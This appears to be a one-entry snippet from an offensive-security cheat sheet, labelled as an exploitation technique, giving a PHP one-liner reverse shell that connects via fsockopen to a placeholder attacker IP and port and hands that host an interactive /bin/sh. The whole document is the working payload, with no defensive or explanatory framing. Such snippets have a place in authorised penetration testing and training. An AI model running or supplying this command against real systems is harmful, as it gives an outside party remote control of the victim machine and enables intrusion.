# [Exploitation] Reverse shell (fsockopen one-liner) --php
php -r '$s=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
